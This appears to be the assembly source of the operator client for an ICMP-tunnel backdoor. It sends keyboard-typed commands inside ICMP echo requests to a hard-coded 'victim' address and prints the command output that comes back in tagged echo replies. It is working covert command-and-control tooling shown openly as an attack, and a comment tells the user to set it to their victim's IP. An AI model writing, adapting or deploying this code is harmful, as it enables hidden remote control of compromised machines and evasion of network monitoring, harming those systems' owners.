section .bss
    fd_no resb 4                ; socket fd
    sniffed_data resb 1200      ; icmp data that returned to us
    incoming_addr resb 16       ; Where IP and Port will be written (16 bytes)
    addr_len      resd 1        ; Where the number "16" will be stored (4 bytes is enough)
    addr_ip resb 16             ; Buffer to store formatted string IP address
section .data
    newline db 10               ; ASCII newline character (\n)
    forip db 4                  ; Unused variable
    space_char db 32            ; ASCII space character
    icmp_packet:
        type db 8               ; ICMP Type 8 (Echo Request)
        code db 0               ; ICMP Code 0
        checksum dw 0           ; Checksum placeholder
        identifier dw 0x1234    ; ID to identify our packets
        sequence db 0xDE, 0xAD  ; Sequence our server will filter with this (0xDEAD)
        payload times 100 db 0  ; Buffer for the command to send
    payload_len equ $ - payload ; Length of the payload section
    target_addr:
        dw 2              ; AF_INET (IPv4)
        dw 0              ; Port (Unused for ICMP)
        dd 0x1901A8C0   ; Victim's Reverse IP (Change according to your victim's IP) 192 168 1 25
        dq 0              ; Padding

section .text
global _start

; RAW SOCKET SYSCALL
_start:
    mov rax, 41             ; sys_socket
    mov rdi, 2              ; AF_INET (IPv4)
    mov rsi, 3              ; SOCK_RAW (Raw access)
    mov rdx, 1              ; IPPROTO_ICMP (ICMP protocol)
    syscall                 ; sockfd is returned in rax
    mov [fd_no],eax         ; rax sockfd is copied into fd_no
;-----------------------------------------------------------------------------------------

_get_command:
    mov rax,0               ; sys_read
    mov rdi,0               ; fd 0 (stdin - Read from keyboard)
    mov rsi,payload         ; Buffer to store the typed command
    mov rdx,100             ; Max bytes to read
    syscall
    
; --- DESTROY THE ENTER CHARACTER ---
    dec rax                         ; rax was the read size, go to the last character (which is \n)
    mov byte [payload + rax], 0     ; Put NULL (0x00) there so the command is clean!
    ; --------------------------------

    call _checksum_cal      ; Calculate checksum of the new command packet
    call _sendto            ; Fire the packet to the server
_sniff:
; R8 R9 REGISTER SETUP FOR WRITING THE IP PART
    mov dword [addr_len], 16   ; First put 16 into the box
    mov r8,incoming_addr       ; Pointer to store the sender's address
    mov r9,addr_len            ; Pointer to the address length
    xor r10,r10                ; Clear r10
;------------------------------------------------------------------------------------------
; --- CLEANUP OPERATION ---
    lea rdi, [sniffed_data] ; Load receive buffer address
    xor al, al              ; al = 0
    mov rcx, 1200           ; Buffer size
    rep stosb               ; Zero everything out so old packets don't mix!
    ; ---------------------------

; RECV FROM / SNIFF INCOMING ICMP PACKETS
    mov rax,45              ; sys_recvfrom 
    mov edi,[fd_no]         ; fdno for recvfrom
    mov rsi,sniffed_data    ; memory address where data will be written
    mov rdx,1200            ; length of data to be read len()
    syscall
;------------------------------------------------------------------------------------------
    cmp byte [sniffed_data + 20], 0     ; filter: Check if ICMP Type is 0 (Echo Reply)
    jne _sniff                          ; filter: If not, ignore and sniff again

    mov cx, word [sniffed_data + 26]    ; Offset 26: Sequence Number
    cmp cx, 0xEFBE                      ; Little endian difference! (0xBEEF)
    jne _sniff                          ; Ignore if sequence doesn't match
    cmp rax,0               ; error handling: check recvfrom return
    jl _error               ; Jump to error if rax < 0
    je _exit                ; Jump to exit if rax == 0
; JUMP IF BELOW
    cmp rax,28              ; Check if packet is large enough (IP + ICMP headers)
    jb _sniff               ; Ignore if too small

;-----------------------------------------------------------------------------------------------

; EXTRACTING IP AND ICMP HEADERS FROM THE DATA TO BE READ (ICMP+IP = 28). ADDITIONALLY PUSH RDX AND PUSH RSI SO REGISTERS DON'T MIX, WE WILL USE THEM IN THE PAYLOAD PART
    mov r14,rax                     ; fd number is in r14 within the loop
    sub r14,28                      ; Calculate actual payload length
    lea rsi, [sniffed_data + 28]    ; rsi now points to the exact start of the data (payload)
    mov rdx,r14                     ; Store payload length
    push rdx                        ; Save to stack
    push rsi                        ; Save payload address to stack

; ALGORITHM TO PROPERLY WRITE THE IP ADDRESS WILL RUN HERE, THEN IT WILL BE WRITTEN IN THE WRITE SYSCALL
    xor rdx,rdx                     ; Clear rdx
    xor rbx,rbx                     ; Clear rbx
    mov rcx,7                       ; Start at offset 7 for IP
    mov rdi,15                      ; String offset
_loopforip:
    mov bl,10                       ; we will divide by 10
    movzx ax,[incoming_addr+rcx]    ; ip offset +4 (Extract raw byte)
_divloop:
    div bl                          ; quotient in al, remainder in ah
    add ah,48                       ; int to string
    mov [addr_ip+rdi],ah            ; ip value inside ax
    dec rdi                         ; Decrement string pointer
    xor ah,ah                       ; for the dirty whatever error
    cmp al,0                        ; loop until remainder is 0
    jg _divloop                     ; Keep looping if > 0
    cmp rcx,4                       ; Check if finished 4 bytes
    je _contiune                    ; Skip adding dot
    mov byte[addr_ip+rdi],46        ; Add dot (.)
_contiune:
    dec rdi                         ; Move pointer back
    dec rcx                         ; I can't write any more comments here, screw this situation :D even I'm not entirely sure, my brain is fried
    cmp rcx,3                       ; Continue loop
    jg _loopforip

;-----------------------------------------------------

; WE ARE PRINTING THE IP
    mov rax,1               ; sys_write
    mov rdi,1               ; stdout
    mov rdx,16              ; string length
    mov rsi,addr_ip         ; string address
    syscall

; putting a space between ip and payload :D for cosmetic purposes
    mov rax,1               ; sys_write
    mov rdi,1               ; stdout
    mov rdx,1               ; length (1 char)
    mov rsi,space_char      ; space address
    syscall

;------------------------------------------------------
    pop rsi                 ; Restore payload address
    pop rdx                 ; Restore payload length
; WE ARE PRINTING THE PAYLOAD
    mov rax,1               ; sys_write
    mov rdi,1               ; write to terminal
    syscall                 ; Print the output received from server
;-----------------------------------------------------

; NEW LINE so payloads and info don't get mixed up
    mov rax,1               ; sys_write
    mov rdi,1               ; write to terminal
    mov rsi,newline         ; printing nextline to terminal so it doesn't write directly adjacent after the first data arrives
    mov rdx,1               ; length 1
    syscall
;------------------------------------------------------
    jmp _get_command        ; Loop back to ask user for the next command


_checksum_cal:
    mov word [checksum],0          ; Reset checksum
    xor rcx,rcx                    ; Clear rcx
    xor r13,r13                    ; Clear r13
    xor rax,rax                    ; Clear rax
    xor r12d,r12d                  ; Clear r12d
    mov rcx,8                      ; ICMP header length                            
    add rcx,payload_len            ; 8 + payload_len = total length to calculate
    mov r13,0                      ; Offset index
    xor rbx,rbx                    ; Clear rbx
.checksum_loop:
    movzx r12d,word[icmp_packet+r13] ; Read 2 bytes
    add eax,r12d                   ; Add to sum
    add r13,2                      ; Move index
    sub rcx,2                      ; Decrement counter
    cmp rcx,2                      ; Check remaining
    jge .checksum_loop             ; Loop if >= 2
    cmp rcx,1                      ; Check for odd byte
    je .final                      ; Handle odd byte
    jmp .wrap                      ; Finish
.final:
    movzx r12d, byte [icmp_packet + r13] ; Read last byte
    add eax, r12d                  ; Add to sum

.wrap:
    mov ebx,eax                    ; Copy sum
    shr ebx,16                     ; Shift right 16 bits
    and eax, 0xFFFF                ; Keep lower 16 bits
    add ax, bx                     ; Add carry
    adc ax, 0                      ; Add extra carry
    not ax                         ; One's complement
    mov [checksum],ax              ; Store final checksum
    ret

_sendto:
    mov r13,8               ; Header length
    add r13,payload_len     ; Total packet length
    mov rax,44              ; sys_sendto
    mov rdi,[fd_no]         ; Raw socket fd
    mov rsi,icmp_packet     ; Packet buffer
    mov rdx,r13             ; Packet length
    mov r10,0               ; Flags
    mov r8,target_addr      ; Target IP address structure
    mov r9,16               ; Structure size
    syscall
    ret

;ERROR HANDLING
_error:
    mov rax,60              ; sys_exit
    mov rdi,1               ; Exit code 1
    syscall
;------------------------------------------------------
_exit:
    mov rax,60              ; sys_exit
    mov rdi,0               ; Exit code 0
    syscall
